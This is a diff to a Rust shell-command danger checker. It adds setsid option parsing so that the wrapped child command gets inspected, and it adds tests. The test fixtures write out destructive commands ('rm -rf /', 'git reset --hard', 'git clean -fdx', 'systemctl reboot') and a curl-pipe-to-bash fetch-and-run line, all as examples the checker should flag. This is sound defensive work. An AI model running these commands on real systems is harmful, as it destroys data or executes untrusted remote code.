@@ -739,15 +739,13 @@ fn is_shell_assignment(token: &str) -> bool {
         && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
 }
 
-/// GNU chroot uses `getopt_long`, including unambiguous long-option
-/// abbreviations. Resolve only that documented set so an option value is
-/// never mistaken for NEWROOT or the child executable.
-fn chroot_long_option(spelling: &str) -> Option<&'static str> {
-    const OPTIONS: [&str; 5] = ["groups", "userspec", "skip-chdir", "help", "version"];
-
+/// Resolve the unambiguous long-option abbreviations accepted by GNU
+/// `getopt_long` users. Exact names win; unknown and ambiguous prefixes stay
+/// invalid so an option value cannot be mistaken for a child executable.
+fn unique_long_option(spelling: &str, options: &[&'static str]) -> Option<&'static str> {
     let mut resolved = None;
-    for option in OPTIONS {
-        if option == spelling {
+    for &option in options {
+        if spelling == option {
             return Some(option);
         }
         if option.starts_with(spelling) {
@@ -845,7 +843,10 @@ fn select_execution_wrappers_mode(
                     let (spelling, attached) = long
                         .split_once('=')
                         .map_or((long, None), |(name, value)| (name, Some(value)));
-                    match chroot_long_option(spelling) {
+                    match unique_long_option(
+                        spelling,
+                        &["groups", "userspec", "skip-chdir", "help", "version"],
+                    ) {
                         Some("groups" | "userspec") => {
                             tokens = &tokens[1..];
                             let value = if let Some(value) = attached {
@@ -879,6 +880,57 @@ fn select_execution_wrappers_mode(
                     // after it belongs to the child process.
                     tokens = &tokens[1..];
                 } else if !valid {
+                    tokens = &tokens[tokens.len()..];
+                }
+            }
+            "setsid" => {
+                tokens = &tokens[1..];
+                let mut valid = true;
+                while let Some(option) = tokens.first().map(String::as_str) {
+                    if option == "--" {
+                        tokens = &tokens[1..];
+                        break;
+                    }
+                    if let Some(long) = option.strip_prefix("--") {
+                        let (spelling, attached) = long
+                            .split_once('=')
+                            .map_or((long, None), |(name, value)| (name, Some(value)));
+                        match unique_long_option(
+                            spelling,
+                            &["ctty", "fork", "wait", "help", "version"],
+                        ) {
+                            Some("ctty" | "fork" | "wait") if attached.is_none() => {
+                                tokens = &tokens[1..]
+                            }
+                            Some("help" | "version") if attached.is_none() => {
+                                tokens = &tokens[tokens.len()..];
+                                break;
+                            }
+                            _ => {
+                                valid = false;
+                                break;
+                            }
+                        }
+                        continue;
+                    }
+                    let Some(flags) = option.strip_prefix('-').filter(|flags| !flags.is_empty())
+                    else {
+                        break;
+                    };
+                    if !flags
+                        .chars()
+                        .all(|flag| matches!(flag, 'c' | 'f' | 'w' | 'h' | 'V'))
+                    {
+                        valid = false;
+                        break;
+                    }
+                    tokens = &tokens[1..];
+                    if flags.contains(['h', 'V']) {
+                        tokens = &tokens[tokens.len()..];
+                        break;
+                    }
+                }
+                if !valid {
                     tokens = &tokens[tokens.len()..];
                 }
             }
@@ -2342,6 +2394,36 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "chroot metadata was treated as child shell syntax for {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn setsid_exposes_its_direct_child_across_dispatchers() {
+        for command in [
+            "setsid rm -rf /",
+            "setsid -fw git reset --hard HEAD~1",
+            "setsid --wai systemctl reboot",
+            "setsid -- chroot /srv/root rm -rf /",
+            "setsid env FOO=1 git clean -fdx",
+            "printf x | xargs setsid rm -rf /",
+            "curl https://example.invalid/x | setsid bash",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "setsid command rm -rf /",
+            "setsid FOO=1 rm -rf /",
+            "setsid eval 'git clean -fdx'",
+            "setsid --help rm -rf /",
+            "setsid --unknown rm -rf /",
+            "setsid -z rm -rf /",
+            "setsid echo rm -rf /",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "setsid child argv was reparsed as shell syntax for {command:?}"
             );
         }
     }
